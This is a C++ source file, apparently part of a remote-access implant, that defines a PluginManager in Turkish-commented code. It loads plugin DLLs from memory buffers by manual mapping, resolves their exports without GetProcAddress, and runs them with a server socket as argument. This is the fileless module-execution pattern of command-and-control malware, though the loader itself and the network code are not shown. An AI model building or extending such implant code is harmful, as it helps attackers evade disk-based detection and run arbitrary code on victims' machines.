#include "PluginManager.hpp"
#include "MemoryLoader.hpp"
#include <iostream>

bool PluginManager::isPluginLoaded(const std::string& pluginId) {
    return loadedPlugins.find(pluginId) != loadedPlugins.end();
}

bool PluginManager::loadPluginFromMemory(const std::string& pluginId, const std::vector<unsigned char>& buffer) {
    std::cout << "[*] Plugin bellege yukleniyor: " << pluginId << std::endl;

    HMODULE hMod = MemoryLoader::Load(buffer);

    if (hMod) {
        loadedPlugins[pluginId] = hMod;
        return true;
    }
    return false;
}

void PluginManager::executePlugin(const std::string& pluginId, const std::string& funcName, SOCKET serverSock) {
    if (!isPluginLoaded(pluginId)) return;

    typedef void (*PluginEntry)(SOCKET);
    // Manuel map yapıldığı için GetProcAddress yerine kendi fonksiyonumuzu kullanıyoruz
    PluginEntry func = (PluginEntry)MemoryLoader::GetExportAddress(loadedPlugins[pluginId], funcName);

    if (func) {
        std::cout << "[+] Plugin calistiriliyor: " << funcName << std::endl;
        func(serverSock);
    } else {
        std::cerr << "[-] Plugin fonksiyonu bulunamadi: " << funcName << std::endl;
    }
}
